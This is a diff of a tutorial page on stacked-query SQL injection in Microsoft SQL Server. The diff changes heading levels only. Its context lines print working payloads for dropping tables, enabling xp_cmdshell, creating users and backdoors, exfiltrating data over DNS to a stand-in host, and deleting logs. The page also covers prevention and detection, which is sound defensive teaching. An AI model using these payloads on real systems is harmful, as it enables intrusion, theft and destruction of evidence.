@@ -7,11 +7,9 @@ tags: ["stacked queries", "multiple statements", "batch injection"]
 lastUpdated: 2025-03-15
 ---
 
-## Stacked Queries
-
 Stacked queries (also known as batch queries or query stacking) allow attackers to execute multiple SQL statements in a single injection. This technique significantly expands the capabilities of SQL injection attacks in Microsoft SQL Server, enabling operations beyond simple data extraction.
 
-### Basic Syntax
+## Basic Syntax
 
 In SQL Server, multiple SQL statements can be separated by semicolons (`;`):
 
@@ -21,7 +19,7 @@ SELECT * FROM users; DROP TABLE logs;
 
 This executes two separate queries: first selecting data, then dropping a table.
 
-### How Stacked Queries Work
+## How Stacked Queries Work
 
 When a database connector supports multiple statements, SQL Server will execute each statement sequentially. Stacked queries allow an attacker to:
 
@@ -30,7 +28,7 @@ When a database connector supports multiple statements, SQL Server will execute 
 3. Add additional SQL statements
 4. Comment out any remaining code (`--`)
 
-### Detection Testing
+## Detection Testing
 
 To test if stacked queries are possible:
 
@@ -41,9 +39,9 @@ To test if stacked queries are possible:
 
 If the application pauses for 5 seconds with the second payload, it likely supports stacked queries.
 
-### Common Attack Patterns
+## Common Attack Patterns
 
-#### Data Modification
+### Data Modification
 
 ```sql
 -- Update data
@@ -56,7 +54,7 @@ If the application pauses for 5 seconds with the second payload, it likely suppo
 ' ; DELETE FROM audit_logs WHERE date < GETDATE() --
 ```
 
-#### Schema Modification
+### Schema Modification
 
 ```sql
 -- Add column
@@ -69,7 +67,7 @@ If the application pauses for 5 seconds with the second payload, it likely suppo
 ' ; DROP TABLE sensitive_data --
 ```
 
-#### Administrative Operations
+### Administrative Operations
 
 ```sql
 -- Create database user
@@ -80,7 +78,7 @@ If the application pauses for 5 seconds with the second payload, it likely suppo
 ' ; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE --
 ```
 
-#### Executing System Commands
+### Executing System Commands
 
 ```sql
 -- Using xp_cmdshell (if enabled)
@@ -92,7 +90,7 @@ EXEC msdb.dbo.sp_add_jobstep @job_name='hack', @step_name='exec', @subsystem='CM
 EXEC msdb.dbo.sp_start_job 'hack' --
 ```
 
-#### Information Gathering
+### Information Gathering
 
 ```sql
 -- Extracting data to a readable location
@@ -103,9 +101,9 @@ EXEC msdb.dbo.sp_start_job 'hack' --
 EXEC xp_dirtree '\\'+@q+'.attacker.com\share' --
 ```
 
-### Advanced Techniques
+## Advanced Techniques
 
-#### Dynamic SQL Execution
+### Dynamic SQL Execution
 
 ```sql
 -- Using EXEC to run dynamic SQL
@@ -115,7 +113,7 @@ EXEC xp_dirtree '\\'+@q+'.attacker.com\share' --
 ' ; EXEC sp_executesql N'SELECT * FROM users WHERE username = @user', N'@user NVARCHAR(50)', @user = 'admin' --
 ```
 
-#### Transaction Manipulation
+### Transaction Manipulation
 
 ```sql
 -- Handling transactions
@@ -125,30 +123,30 @@ EXEC xp_dirtree '\\'+@q+'.attacker.com\share' --
 ' ; BEGIN TRY BEGIN TRANSACTION; UPDATE accounts SET balance = balance + 1000 WHERE account_id = 1234; COMMIT; END TRY BEGIN CATCH ROLLBACK; END CATCH --
 ```
 
-#### Error Handling
+### Error Handling
 
 ```sql
 -- Using TRY...CATCH for error handling
 ' ; BEGIN TRY EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; END TRY BEGIN CATCH END CATCH; EXEC xp_cmdshell 'dir C:\' --
 ```
 
-#### Conditional Execution
+### Conditional Execution
 
 ```sql
 -- Using IF statements for conditional execution
 ' ; IF (SELECT COUNT(*) FROM sysobjects WHERE name = 'sensitive_data') > 0 BEGIN SELECT * FROM sensitive_data END --
 ```
 
-### Real-World Impact Examples
+## Real-World Impact Examples
 
-#### Data Theft
+### Data Theft
 
 ```sql
 -- Extract all user data with credentials
 ' ; SELECT * FROM users WHERE 1=0; SELECT username, password, email FROM users; --
 ```
 
-#### Backdoor Creation
+### Backdoor Creation
 
 ```sql
 -- Create persistent access
@@ -158,14 +156,14 @@ BEGIN
 END --
 ```
 
-#### Evidence Removal
+### Evidence Removal
 
 ```sql
 -- Clean up traces
 ' ; DELETE FROM logs WHERE activity LIKE '%login%'; UPDATE logs SET timestamp = DATEADD(day, -30, timestamp) --
 ```
 
-### Prevention Techniques
+## Prevention Techniques
 
 To prevent stacked query attacks:
 
@@ -196,7 +194,7 @@ To prevent stacked query attacks:
 
 5. Consider using ORMs that protect against SQL injection by design
 
-### Defensive Implementation Examples
+## Defensive Implementation Examples
 
 ```csharp
 // C# - Parameterized query (safe)
@@ -216,7 +214,7 @@ const query = 'SELECT * FROM users WHERE username = $1';
 client.query(query, [userInput]);
 ```
 
-### Detection and Response
+## Detection and Response
 
 To detect stacked query attacks:
 
